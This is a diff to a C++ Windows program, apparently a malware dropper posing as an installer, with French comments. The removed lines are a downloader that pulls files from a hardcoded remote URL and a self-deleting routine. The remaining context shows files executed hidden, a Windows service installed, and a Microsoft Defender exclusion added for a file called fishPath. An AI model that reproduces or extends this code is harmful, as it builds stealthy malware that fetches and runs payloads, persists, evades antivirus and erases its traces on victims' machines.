@@ -15,59 +15,9 @@ using namespace std;
 const string SERVER_URL = "https://arthur.xn--pruvost-rivire-6jb.fr/cdn/";
 const string FILE_LIST = "files.txt";
 
-// Fonction pour télécharger un fichier depuis une URL
-bool DownloadFile(const string& url, const string& localPath) {
-    HINTERNET hInternet = InternetOpen("Installer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet) return false;
-
-    HINTERNET hUrl = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
-    if (!hUrl) {
-        InternetCloseHandle(hInternet);
-        return false;
-    }
-
-    char buffer[4096];
-    DWORD bytesRead;
-    HANDLE hFile = CreateFile(localPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        InternetCloseHandle(hUrl);
-        InternetCloseHandle(hInternet);
-        return false;
-    }
-
-    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
-        DWORD bytesWritten;
-        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
-    }
-
-    CloseHandle(hFile);
-    InternetCloseHandle(hUrl);
-    InternetCloseHandle(hInternet);
-    return true;
-}
-
-// Fonction pour lire la liste des fichiers depuis files.txt
-vector<string> GetFileList(const string& filePath) {
-    vector<string> fileList;
-    ifstream file(filePath);
-    string line;
-    while (getline(file, line)) {
-        fileList.push_back(line);
-    }
-    return fileList;
-}
-
 // Fonction pour exécuter un fichier
 void ExecuteFile(const string& filePath) {
     ShellExecute(NULL, "open", filePath.c_str(), NULL, NULL, SW_HIDE);
-}
-
-// Fonction pour s'auto-supprimer
-void SelfDelete() {
-    char cmd[MAX_PATH];
-    GetModuleFileName(NULL, cmd, MAX_PATH);
-    string deleteCmd = "cmd /c timeout 2 & del \"" + string(cmd) + "\"";
-    system(deleteCmd.c_str());
 }
 
 // Fonction pour installer un service Windows
@@ -171,9 +121,6 @@ int main() {
 
     // Ajouter une exclusion antivirus
     AddDefenderExclusion(fishPath);
-
-    // S'auto-supprimer
-    SelfDelete();
 
     return 0;
 }
